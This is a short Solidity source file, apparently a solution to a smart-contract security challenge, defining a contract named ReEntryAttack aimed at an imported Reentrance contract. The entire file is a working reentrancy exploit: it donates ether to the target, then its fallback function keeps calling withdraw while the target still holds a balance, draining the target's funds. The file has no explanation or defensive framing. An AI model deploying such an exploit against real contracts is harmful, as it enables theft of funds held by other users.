pragma solidity ^0.6.0;

import './Reentrance.sol';

contract ReEntryAttack {
    
    uint256 public amount = 1 ether;
    Reentrance target;
    address private owner;
    
    
    constructor(address payable _targetAddr) public payable {
        target = Reentrance(_targetAddr);
        owner = msg.sender;
    }
    
    function donateToContract() public {
        target.donate.value(amount)(address(this));
    }
    
    
    fallback() external payable {
        if (address(target).balance != 0) {
            target.withdraw(amount);
        }
    }
    
}
